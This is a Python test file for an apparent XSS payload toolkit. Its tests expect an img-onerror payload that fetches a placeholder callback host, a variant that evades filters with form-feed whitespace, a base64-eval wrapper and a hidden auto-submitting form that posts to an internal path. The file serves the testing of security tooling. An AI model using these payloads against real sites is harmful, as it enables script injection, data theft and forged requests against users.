import webtools.xss
import base64

def test_it_injects_a_js_script_as_img():
    as_img = webtools.xss.as_img("""
    fetch('http://webhook.test').then(d => alert(d))
    """)
    expected = "<img src=x onerror='fetch(\\'http://webhook.test\\').then(d=>alert(d))'/>"

    assert expected == as_img

def test_it_uses_the_configured_whitespace_in_as_img():
    webtools.xss.context['whitespace'] = "\f"

    as_img = webtools.xss.as_img("""
    fetch('http://webhook.test').then(d=>alert(d))
    """)
    expected = "<img\fsrc=x\fonerror='fetch(\\'http://webhook.test\\').then(d=>alert(d))'/>"

    assert expected == as_img


def test_it_evals_a_base64_script():
    script = """alert(1)"""
    assert "eval('" + base64.b64encode(script.encode()).decode() + "')" == webtools.xss.eval_base64(script)


def test_it_generates_a_form_submit_script():
    expected = """
const formData = new FormData();
formData.append('username', 'hyper');

var binaryData = new Uint8Array([0x10, 0x25]);
var fileBlob = new Blob([binaryData], { type: 'application/octet-stream' });
formData.append('file1', fileBlob, 'test1.txt');
        

var binaryData = new Uint8Array([0x50, 0x90]);
var fileBlob = new Blob([binaryData], { type: 'application/octet-stream' });
formData.append('file2', fileBlob, 'test2.txt');
        

const form = document.createElement('form');
form.method = 'POST';
form.action = '/internal/submit'; 
form.enctype = 'multipart/form-data';

for (const [key, value] of formData.entries()) {
    const input = document.createElement('input');
    input.type = 'hidden';
    input.name = key;
    input.value = value;
    form.appendChild(input);
}

document.body.appendChild(form);
form.submit();
"""
    assert expected == webtools.xss.form_submit_script('/internal/submit', [
        ('username', 'hyper'),
        ('file1', b'\x10\x25', 'test1.txt'),
        ('file2', b'\x50\x90', 'test2.txt'),
    ])
